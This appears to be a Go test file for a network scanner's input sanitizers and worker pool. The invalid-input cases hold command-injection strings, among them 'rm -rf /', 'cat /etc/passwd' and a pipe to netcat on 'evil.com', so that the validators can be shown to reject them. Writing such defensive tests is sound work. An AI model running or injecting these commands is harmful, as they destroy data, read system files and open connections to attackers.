package scanner

import (
	"testing"
)

func TestSanitizeCIDR_Valid(t *testing.T) {
	cases := []string{
		"192.168.1.0/24",
		"10.0.0.0/8",
		"172.16.0.0/12",
		"0.0.0.0/0",
		"255.255.255.255/32",
	}
	for _, c := range cases {
		if err := sanitizeCIDR(c); err != nil {
			t.Errorf("expected valid for %q, got: %v", c, err)
		}
	}
}

func TestSanitizeCIDR_Invalid(t *testing.T) {
	cases := []struct {
		cidr string
		msg  string
	}{
		{"", "empty"},
		{"192.168.1.0", "no prefix"},
		{"192.168.1.0/33", "prefix too large"},
		{"192.168.1.0/-1", "negative prefix"},
		{"256.1.1.0/24", "octet overflow"},
		{"192.168.1.0/24;rm -rf /", "semicolon injection"},
		{"192.168.1.0/24`id`", "backtick injection"},
		{"192.168.1.0/24$(whoami)", "command substitution"},
		{"192.168.1.0/24|nc evil.com 4444", "pipe injection"},
	}
	for _, c := range cases {
		if err := sanitizeCIDR(c.cidr); err == nil {
			t.Errorf("expected error for %s (%s), got nil", c.cidr, c.msg)
		}
	}
}

func TestSanitizeIP_Valid(t *testing.T) {
	cases := []string{
		"192.168.1.1",
		"10.0.0.1",
		"::1",
		"2001:db8::1",
	}
	for _, c := range cases {
		if err := sanitizeIP(c); err != nil {
			t.Errorf("expected valid for %q, got: %v", c, err)
		}
	}
}

func TestSanitizeIP_Invalid(t *testing.T) {
	cases := []string{
		"",
		"not.an.ip",
		"192.168.1.300",
		"192.168.1.1;id",
		"192.168.1.1`ls`",
		"192.168.1.1$(cat /etc/passwd)",
		"192.168.1.1|nc evil.com",
	}
	for _, c := range cases {
		if err := sanitizeIP(c); err == nil {
			t.Errorf("expected error for %q, got nil", c)
		}
	}
}

func TestWorkerPoolCapacity(t *testing.T) {
	if cap(scanWorkerPool) != 20 {
		t.Errorf("expected worker pool capacity 20, got %d", cap(scanWorkerPool))
	}
	acquireWorker()
	acquireWorker()
	if len(scanWorkerPool) != 2 {
		t.Errorf("expected 2 workers acquired, got %d", len(scanWorkerPool))
	}
	releaseWorker()
	if len(scanWorkerPool) != 1 {
		t.Errorf("expected 1 worker after release, got %d", len(scanWorkerPool))
	}
	releaseWorker()
}
